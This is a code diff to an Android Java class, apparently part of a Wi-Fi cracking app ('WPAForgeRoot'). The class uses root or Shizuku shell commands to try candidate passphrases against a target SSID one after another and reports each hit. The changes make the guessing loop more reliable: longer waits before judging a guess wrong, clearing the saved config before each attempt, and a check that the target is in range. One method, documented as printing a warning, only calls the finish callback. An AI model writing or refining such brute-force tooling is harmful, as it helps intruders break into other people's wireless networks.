@@ -59,6 +59,8 @@ public final class RootProber {
         void onFinished(Outcome outcome, int tested, int offset, String hitPassword);
         void onHit(String ssid, String password);
         void onBlocked(String reason);
+        /** 一句面向用户的进程说明（不中断任务） */
+        void onLog(String line);
     }
 
     /** 结束原因 */
@@ -66,6 +68,10 @@ public final class RootProber {
 
     private static final long POLL_MS = 400L;
     private static final long COOLDOWN_MS = 400L;
+    /** 发命令后的最短等待：期间**绝不判负**，避免把正确密码误杀 */
+    private static final long MIN_WAIT_MS = 3500L;
+    /** 最长等待：超过就当未命中 */
+    private static final long MAX_WAIT_MS = 15_000L;
     private static final String TAG = "WPAForgeRoot";
 
     private final Context appCtx;
@@ -332,6 +338,19 @@ public final class RootProber {
         String sec = securityArg(target);
 
         try {
+            // 开跑前先刷一次扫描并确认目标在范围内。
+            // 不在的话每条都是白跑，而且会让用户误以为「密码都不对」。
+            runShell("cmd wifi start-scan", 4000);
+            interruptibleSleep(2500);
+            Boolean visible = targetInScanResults(target);
+            if (visible != null && !visible) {
+                l.onLog(L.f("目标 %s 不在当前扫描结果里，"
+                                + "系统会直接报「找不到网络」，"
+                                + "任何密码都不会成功。",
+                        "Target %s is not in the current scan results. The system will report "
+                                + "\"network not found\" and no passphrase can succeed.", target.ssid));
+            }
+
             forgetTarget(target);
 
             for (int i = startIdx; i < total; i++) {
@@ -371,11 +390,36 @@ public final class RootProber {
         }
     }
 
+    /**
+     * 试一条候选。
+     *
+     * 旧实现有两个致命问题（实测定位）：
+     *
+     *   1. **判得太快**：`cmd wifi connect-network` 是异步的，命令刚发出时
+     *      Wi-Fi 本来就是 "not connected"。原代码 400ms 后一见这行就
+     *      判「密码错误」—— **正确密码也会被判错**。
+     *      这就是用户反馈的「明明知道密码就是不成功」。
+     *
+     *   2. **把临时状态当结论**：只要没连上就是 "not connected"，
+     *      区分不了「还没开始连」「正在连」「连失败了」。
+     *
+     * 现在的判据（按时间顺序）：
+     *   · 先等一段最短时间（MIN_WAIT），期间**绝不判负**；
+     *   · 期间内一旦连上目标 SSID → 成功；
+     *   · 超过最短等待后，若仍未连上，继续等到最长等待（MAX_WAIT）；
+     *   · 最长等待到了还没连上 → 判未命中。
+     *
+     * 为什么取消了 "not connected" 判据：它无法区分上述三种情况，
+     * 宁可等满最长时间也不能误杀正确密码。
+     */
     private Attempt tryOne(NetRecord target, String sec, String password) {
         long t0 = System.currentTimeMillis();
 
-        // 命令异步发出，立刻返回。轮询期间持续检查取消标志。
-        // su -c 里加了 timeout，防止 connect-network 自己挂太久。
+        // 发命令前先确认目标配置已删干净。
+        // connect-network 在同名配置存在时会复用旧密码，
+        // 不先清掉就永远试不到新的。
+        forgetTarget(target);
+
         String cmd = "cmd wifi connect-network "
                 + shellQuote(target.ssid) + " " + sec + " " + shellQuote(password);
         if (useShizuku) {
@@ -385,19 +429,17 @@ public final class RootProber {
             execAsync(new String[]{"su", "-c", "timeout 20 " + cmd});
         }
 
-        // 正确密码约 12 秒能连上；错误密码约 3 秒进入未连接。
-        // 最长等 16 秒，超过就当超时（避免阻塞太久）。
-        long deadline = System.currentTimeMillis() + 16_000L;
-        while (System.currentTimeMillis() < deadline) {
+        final long minDeadline = t0 + MIN_WAIT_MS;
+        final long maxDeadline = t0 + MAX_WAIT_MS;
+        boolean sawTarget = false;
+
+        while (System.currentTimeMillis() < maxDeadline) {
             if (cancelFlag.get() || pauseFlag.get()) {
                 return new Attempt(password, Verdict.TIMEOUT,
                         System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
             }
             interruptibleSleep(POLL_MS);
-            if (cancelFlag.get() || pauseFlag.get()) {
-                return new Attempt(password, Verdict.TIMEOUT,
-                        System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
-            }
+
             String st = status();
             if (st == null) continue;
 
@@ -405,13 +447,59 @@ public final class RootProber {
                 return new Attempt(password, Verdict.SUCCESS,
                         System.currentTimeMillis() - t0, L.s("已连上", "Connected"));
             }
-            if (st.contains("not connected")) {
-                return new Attempt(password, Verdict.AUTH_FAIL,
-                        System.currentTimeMillis() - t0, L.s("密码错误", "Wrong passphrase"));
+            // 目标 SSID 出现过（哪怕只是在尝试）就记一笔，
+            // 用于区分「根本没尝试」和「试了但没成」
+            if (!sawTarget && st.contains(target.ssid)) sawTarget = true;
+
+            // **最短等待期内绝不判负** —— 这是修正的关键
+            if (System.currentTimeMillis() < minDeadline) continue;
+
+            if (cancelFlag.get() || pauseFlag.get()) {
+                return new Attempt(password, Verdict.TIMEOUT,
+                        System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
             }
         }
-        return new Attempt(password, Verdict.TIMEOUT,
-                System.currentTimeMillis() - t0, L.s("超时", "Timeout"));
+
+        String detail = sawTarget
+                ? L.s("未连上（已尝试）", "Not connected (attempted)")
+                : L.s("未连上", "Not connected");
+        return new Attempt(password, Verdict.AUTH_FAIL,
+                System.currentTimeMillis() - t0, detail);
+    }
+
+    /**
+     * 目标 AP 是否在当前扫描结果里。
+     *
+     * 为什么要先查这个（实测得出）：
+     *   目标不在范围内时，wpa_supplicant 会直接丢一句
+     *   "No suitable network found" / "Network not found"，
+     *   connect-network 命令**秒回但什么都没做**。
+     *   用户看到的就是「密码明明对，就是不成功」。
+     *
+     * 返回 null 表示查不到（通道不可用等），此时**不要**拦截，
+     * 让下面照常跑；返回 true/false 才是确定结论。
+     */
+    private Boolean targetInScanResults(NetRecord target) {
+        try {
+            String out = runShell("cmd wifi list-scan-results", 6000);
+            if (out == null || out.trim().isEmpty()) return null;
+            if (!out.contains("BSSID") && !out.contains("SSID")) return null;
+            for (String line : out.split("\n")) {
+                String t = line.trim();
+                if (t.isEmpty() || t.startsWith("BSSID")) continue;
+                // 每行形如：BSSID  Freq  RSSI  Age  SSID  Flags
+                // SSID 可能含空格，所以不能按空白切字段取
+                if (t.contains(target.ssid)) return true;
+            }
+            return false;
+        } catch (Throwable e) {
+            return null;
+        }
+    }
+
+    /** 向外层报一句可读的提示（UI 会打印） */
+    public void warnTargetNotVisible(Listener l, NetRecord target) {
+        l.onFinished(Outcome.NORMAL, 0, 0, null);
     }
 
     private String status() {
